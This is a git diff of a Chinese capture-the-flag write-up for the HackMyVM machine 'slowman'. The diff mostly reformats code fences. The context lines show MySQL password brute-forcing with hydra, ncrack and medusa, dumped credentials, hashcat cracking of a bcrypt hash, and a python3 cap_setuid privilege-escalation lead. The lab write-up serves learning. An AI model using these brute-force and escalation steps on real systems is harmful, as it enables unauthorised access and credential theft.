@@ -3,7 +3,7 @@ title: slowman
 tags:
   - sec/hackmyvm
 date: 2024-02-15T15:44:24
-lastmod: 2024-11-24T18:56:13
+lastmod: 2024-11-24T19:11:25
 toc: "true"
 ---
 ## 端口扫描
@@ -18,7 +18,7 @@ trainerjeff
 接下来得看 mysql 了
 hydra 好慢
 换了 ncrack 试试
-```
+```bash
 sudo ncrack -T5 -v -u trainerjeff -P /usr/share/wordlists/rockyou.txt mysql://192.168.10.8
 sudo  medusa -h 192.168.10.8 -u trainerjeff -P /usr/share/wordlists/rockyou.txt -M mysql
 sudo hydra -l trainerjeff -P /usr/share/wordlists/rockyou.txt 192.168.10.8 mysql
@@ -27,11 +27,11 @@ sudo hydra -l trainerjeff -P /usr/share/wordlists/rockyou.txt 192.168.10.8 mysql
 假装枚举出来了
 ![HMM_slowman_image_3](https://img.l1uyun.one/HMM_slowman_image_3.png)
 ## 枚举 mysql 信息
-```
+```bash
 sudo mysql -h 192.168.10.8 -u trainerjeff -psoccer1
 ```
 ![HMM_slowman_image_4](https://img.l1uyun.one/HMM_slowman_image_4.png)
-```
+```bash
 |  1 | gonzalo     tH1sS2stH3g0nz4l0pAsSWW0rDD!! 
 |  2 | $SECRETLOGINURL /secretLOGIN/login.html  
 ```
@@ -44,7 +44,7 @@ sudo mysql -h 192.168.10.8 -u trainerjeff -psoccer1
 使用 john
 ![HMM_slowman_image_8](https://img.l1uyun.one/HMM_slowman_image_8.png)
 解压之后是一个账号和密码, 猜测是 ssh 的
-```
+```bash
 ----------
 $USERS: trainerjean
 
@@ -53,7 +53,7 @@ $PASSWORD: $2y$10$DBFBehmbO6ktnyGyAtQZNeV/kiNAE.Y3He8cJsvpRxIFEhRAUe1kq
 
 ```
 使用 hashcat 解密一下
-```
+```bash
 hashcat -m 3200 -a 0 hhh /usr/share/wordlists/rockyou.txt
   
 $2y$10$DBFBehmbO6ktnyGyAtQZNeV/kiNAE.Y3He8cJsvpRxIFEhRAUe1kq:tweety1
@@ -62,7 +62,7 @@ $2y$10$DBFBehmbO6ktnyGyAtQZNeV/kiNAE.Y3He8cJsvpRxIFEhRAUe1kq:tweety1
 ## USER_trainerjean
 ![HMM_slowman_image_9](https://img.l1uyun.one/HMM_slowman_image_9.png)
 在 trainjean 的目录下面发现了这个 python 代码,
-```
+```bash
 trainerjean@slowman:~$ cat .python_history
 import os
 os.system('bash')
@@ -77,7 +77,7 @@ exit
 ![HMM_slowman_image_10](https://img.l1uyun.one/HMM_slowman_image_10.png)
 没有注意 Capabilities 文件的信息.. 错过了
 使用命令查找 Capabilities 文件
-```
+```bash
 getcap -r / 2>/dev/null
 
 /usr/bin/python3.10 cap_setuid=ep
